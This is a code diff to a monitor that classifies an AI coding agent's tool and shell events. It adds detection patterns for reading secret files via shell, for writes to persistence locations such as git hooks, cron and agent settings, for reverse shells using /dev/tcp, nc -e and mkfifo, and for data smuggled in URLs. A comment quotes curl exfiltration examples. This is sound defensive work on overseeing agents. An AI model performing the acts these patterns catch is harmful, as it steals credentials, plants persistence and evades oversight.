@@ -106,6 +106,34 @@ const SECRET_SHAPES: Array<[RegExp, string]> = [
   [/(^|\/)\.git-credentials$/, 'credential-store'],
 ];
 
+/**
+ * Shell commands that read file contents.
+ *
+ * The shell is a second, parallel filesystem API. `cat /repo/.env` is the same
+ * act as the Read tool performing it, and a guard that only watches the tool
+ * sees a session that never touched a secret — while the agent holds it.
+ */
+const READING_COMMANDS =
+  /\b(cat|head|tail|less|more|strings|xxd|od|base64|awk|sed|grep|rg|cp|mv|tar|zip)\b/;
+
+/**
+ * Locations whose contents execute later, without anyone invoking them.
+ *
+ * A write here outlives the session: it is the difference between an agent
+ * doing something now and an agent arranging for something to happen every time
+ * the developer commits, opens a shell, or logs in.
+ */
+const PERSISTENCE_PATHS = [
+  /\/\.git\/hooks\//,
+  /\/\.(bash|zsh)rc$/,
+  /\/\.(bash_profile|zprofile|profile)$/,
+  /\/\.config\/systemd\//,
+  /\/Library\/LaunchAgents\//,
+  /\/etc\/cron/,
+  /\/\.claude\/settings/,
+  /\/\.vscode\/tasks\.json$/,
+];
+
 /** Git subcommands, so the Brain can decide which ones mutate. */
 const GIT_OPS = ['push', 'commit', 'remote-add', 'remote-set', 'tag', 'reset-hard', 'force-push'];
 
@@ -206,13 +234,25 @@ export function toSignal(event: HookEvent, opts: MapOptions): Signal | null {
     const host = outboundHost(command);
     const gitOp = gitOperation(command);
 
+    // A shell command can read a secret just as well as the Read tool can.
+    // Report the shape here too, or `cat .env` looks like an ordinary command
+    // and the session appears never to have touched a secret.
+    const shellSecret = shellSecretShape(command);
+    if (shellSecret) {
+      base.attributes['secret_shape'] = shellSecret;
+      base.attributes['secret_count'] = 1;
+    }
+
     if (host) {
       return {
         ...base,
         kind: Kind.Network,
         target: { type: TargetType.Host, value: host, scope: Scope.External },
         transfer: transferDirection(command),
-        attributes: { ...base.attributes, command_shape: 'network' },
+        attributes: {
+          ...base.attributes,
+          command_shape: isRemoteShell(command) ? 'remote_shell' : 'network',
+        },
       };
     }
     if (gitOp) {
@@ -252,13 +292,20 @@ export function toSignal(event: HookEvent, opts: MapOptions): Signal | null {
   }
 
   const shape = secretShape(path);
+  const attributes = { ...base.attributes };
+  if (shape) {
+    attributes['secret_shape'] = shape;
+    attributes['secret_count'] = 1;
+  }
+  if (kind === Kind.FileWrite && isPersistencePath(path)) {
+    attributes['write_shape'] = 'persistence';
+  }
+
   return {
     ...base,
     kind,
     target: { type: TargetType.Path, value: path, scope: scopeOf(path, opts) },
-    attributes: shape
-      ? { ...base.attributes, secret_shape: shape, secret_count: 1 }
-      : base.attributes,
+    attributes,
   };
 }
 
@@ -274,14 +321,27 @@ export function toSignal(event: HookEvent, opts: MapOptions): Signal | null {
  * which does not latch egress — guessing here would reintroduce the false
  * positive this function exists to remove.
  *
- * ponytail: flag matching, not a shell parser. Two known blind spots, both of
- * which fail toward Unknown rather than toward a wrong answer:
- *   - data smuggled in a URL query string (`curl "https://x/?k=$SECRET"`)
- *   - a pipe into a network tool (`cat .env | curl --data-binary @- https://x`)
- *     is caught only by its `@-` flag, not by the pipe itself
- * Close them when a recorded session shows one, not before.
+ * ponytail: flag matching, not a shell parser. Remaining blind spot, which fails
+ * toward Unknown rather than toward a wrong answer: a bare pipe into a network
+ * tool is caught by the tool's own flags, not by the pipe. Close it when a
+ * recorded session shows one, not before.
  */
 export function transferDirection(command: string): Transfer {
+  // A shell opening /dev/tcp is a two-way channel; treat it as a send, because
+  // that is the half that matters.
+  if (/\/dev\/(?:tcp|udp)\//.test(command)) return Transfer.Egress;
+
+  // Command substitution inside a URL means computed data is being placed in
+  // the request itself. There is no body to inspect, which is exactly the
+  // point of the technique.
+  if (/https?:\/\/[^\s'"]*(\$\(|`|\$\{)/.test(command)) return Transfer.Egress;
+
+  // A long opaque query value is a payload wearing a URL.
+  const query = command.match(/https?:\/\/[^\s'"]*\?([^\s'"]+)/i);
+  if (query?.[1] && query[1].split('&').some((kv) => (kv.split('=')[1] ?? '').length > 64)) {
+    return Transfer.Egress;
+  }
+
   // curl: any flag that attaches a body or a file.
   if (/\bcurl\b/.test(command)) {
     if (/(^|\s)(-d|-F|-T|--data|--data-raw|--data-binary|--data-urlencode|--form|--upload-file|--json)(\s|=)/.test(command)) {
@@ -344,6 +404,50 @@ export function scopeOf(path: string, opts: Pick<MapOptions, 'cwd' | 'home'>): S
   return Scope.System;
 }
 
+/**
+ * The secret shape a shell command touches, if any.
+ *
+ * Only fires for commands that actually read content: `rm /repo/.env` destroys
+ * a secret but does not learn it, and treating the two alike would put a
+ * cleanup script in the same bucket as a theft.
+ */
+export function shellSecretShape(command: string): string | null {
+  if (!READING_COMMANDS.test(command)) {
+    // `env` and `printenv` read no file but dump every secret the process was
+    // handed, which is where credentials increasingly live.
+    return /\b(env|printenv)\b/.test(command) ? 'env-file' : null;
+  }
+
+  for (const token of command.split(/[\s'"<>|;&]+/)) {
+    const shape = secretShape(token);
+    if (shape) return shape;
+  }
+  return null;
+}
+
+/**
+ * Whether a command wires a shell to a remote socket.
+ *
+ * This is not data leaving — it is control arriving. Scoring it as egress
+ * undersells it: exfiltration loses whatever the session had, a reverse shell
+ * loses everything the machine will ever have.
+ */
+export function isRemoteShell(command: string): boolean {
+  if (/\/dev\/(?:tcp|udp)\/[\w.-]+\/\d+/.test(command) && /\b(bash|sh|zsh)\b/.test(command)) {
+    return true;
+  }
+  // nc -e / --exec hands a shell to whoever connects.
+  if (/\b(nc|ncat)\b[^\n]*\s(-e|--exec|-c)\s/.test(command)) return true;
+  // The classic FIFO round-trip, which uses no flag that looks dangerous.
+  if (/mkfifo[^\n]*\|[^\n]*\b(nc|ncat)\b/.test(command)) return true;
+  return false;
+}
+
+/** Whether a write lands somewhere that executes later. */
+export function isPersistencePath(path: string): boolean {
+  return PERSISTENCE_PATHS.some((p) => p.test(path));
+}
+
 export function secretShape(path: string): string | null {
   for (const [pattern, shape] of SECRET_SHAPES) {
     if (pattern.test(path)) return shape;
@@ -362,6 +466,11 @@ export function secretShape(path: string): string | null {
  * up in recorded sessions rather than in imagination.
  */
 export function outboundHost(command: string): string | null {
+  // Bash's /dev/tcp is a network socket wearing a filename. It is how a reverse
+  // shell is opened without any tool that looks like networking.
+  const devSocket = command.match(/\/dev\/(?:tcp|udp)\/([\w.-]+)\/\d+/i);
+  if (devSocket?.[1]) return devSocket[1].toLowerCase();
+
   const url = command.match(/https?:\/\/([^\s/'"|)]+)/i);
   if (url?.[1]) return url[1].toLowerCase();
 
